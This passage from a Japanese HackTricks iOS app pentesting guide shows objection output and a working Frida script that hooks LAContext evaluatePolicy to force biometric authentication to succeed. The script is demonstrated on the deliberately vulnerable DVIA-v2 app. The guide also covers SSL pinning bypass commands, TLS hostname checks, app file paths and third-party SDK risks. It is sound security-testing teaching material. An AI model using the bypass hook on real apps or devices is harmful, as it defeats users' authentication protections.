...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
もし脆弱性がある場合、モジュールは自動的にログインフォームをバイパスします。

#### Frida

[DVIA-v2アプリケーション](https://github.com/prateek147/DVIA-v2)から**`evaluatePolicy`**の使用例：
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
ローカル認証をバイパスするためには、上記に貼り付けられたコードスニペットで示されているように、**evaluatePolicy**のチェックをバイパスするFridaスクリプトを作成する必要があります。上記のコードスニペットでわかるように、**evaluatePolicy**は**callback**を使用して**result**を決定します。したがって、ハックを達成する最も簡単な方法は、そのコールバックを傍受し、常に**success=1**を返すようにすることです。
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```

```
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## IPCを介した機密機能の公開

### カスタムURIハンドラー/ディープリンク/カスタムスキーム

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### ユニバーサルリンク

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### UIActivity共有

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### アプリ拡張機能

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### Webビュー

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### シリアル化とエンコーディング

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## ネットワーク通信

**暗号化なしでの通信**が行われていないことを確認することは重要です。また、アプリケーションがサーバーのTLS証明書を正しく**検証している**ことも確認する必要があります。\
このような問題をチェックするためには、**Burp**のようなプロキシを使用できます。

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### ホスト名のチェック

TLS証明書の検証における一般的な問題は、証明書が**信頼できるCAによって署名されているかどうか**をチェックすることですが、証明書の**ホスト名**がアクセスされているホスト名と一致しているかどうかを**チェックしない**ことです。\
この問題をBurpを使用してチェックするためには、iPhoneでBurp CAを信頼した後、Burpで**異なるホスト名のために新しい証明書を作成**して使用します。アプリケーションがまだ動作する場合、何かが脆弱です。

### 証明書ピニング

アプリケーションが正しくSSLピニングを使用している場合、アプリケーションは証明書が予想されるものである場合にのみ動作します。しかし、テスト中のアプリケーションでは、Burpが独自の証明書を提供するため、問題が発生する可能性があります。\
Jailbrokenデバイス内でこの保護をバイパスするために、アプリケーション[**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2)をインストールするか、[**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)をインストールすることができます。

また、**objection**の`ios sslpinning disable`を使用することもできます。

## その他

* **`/System/Library`**には、システムアプリケーションで使用される電話にインストールされたフレームワークがあります。
* ユーザーがApp Storeからインストールしたアプリケーションは、**`/User/Applications`**にあります。
* **`/User/Library`**には、ユーザーレベルのアプリケーションによって保存されたデータが含まれています。
* **`/User/Library/Notes/notes.sqlite`**にアクセスして、アプリケーション内に保存されたメモを読むことができます。
* インストールされたアプリケーションのフォルダー（**`/User/Applications/<APP ID>/`**）の中には、いくつかの興味深いファイルがあります：
* **`iTunesArtwork`**：アプリで使用されるアイコン
* **`iTunesMetadata.plist`**：App Storeで使用されるアプリの情報
* **`/Library/*`**：設定とキャッシュが含まれています。**`/Library/Cache/Snapshots/*`**には、バックグラウンドに送信する前にアプリケーションに対して実行されたスナップショットがあります。

### ホットパッチング/強制更新

開発者は、アプリをApp Storeに再提出して承認されるまで待つことなく、**すべてのインストールされたアプリをリモートで即座にパッチ**することができます。\
この目的のためには、通常は[JSPatch](https://github.com/bang590/JSPatch)が使用されますが、[Siren](https://github.com/ArtSabintsev/Siren)や[react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker)などの他のオプションもあります。\
**これは悪意のある第三者のSDKによって悪用される可能性がある危険なメカニズムです。そのため、自動更新に使用される方法（あれば）を確認し、テストすることが推奨されます。**この目的のために、以前のバージョンのアプリをダウンロードしてみることができます。

### サードパーティ

サードパーティのSDKの問題の一つは、SDKが提供する機能に対して**細かい制御ができない**ことです。SDKを使用すると、診断的な情報漏洩や安全でないHTTP接続を含むすべての機能を使用することになります。また、通常、アプリケーションの開発者はSDKの脆弱性を**パッチすることができません**。\
さらに、一部のSDKは、コミュニティに非常に信頼されるようになると、**マルウェアを含むようになる**ことがあります。

さらに、これらのサービスが提供する機能には、アプリの使用中にユーザーの行動を監視するための**トラッキングサービス**、バナー広告の販売、ユーザーエクスペリエンスの向上などが含まれる場合があります。サードパーティサービスのデメリットは、開発者がサードパーティライブラリを介して実行されるコードの詳細を把握できないことです。そのため、サービスに送信する情報は必要最小限にとどめ、機密情報は開示しないようにする必要があります。

データをサードパーティサービスに送信する際には、ユーザーアカウントを特定することができるPII（個人を特定できる情報）の公開を防ぐために、データを匿名化する必要があります。

アプリケーションが使用している**ライブラリ**は、アプリに対して**`otool`**を実行することで見つけることができます（さらに使用されている共有ライブラリを見つけるために、各共有ライブラリに対して実行することもできます）。

## **参考文献**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
## 詳細情報

* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS無料コース([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-Cバージョン [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swiftバージョン
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
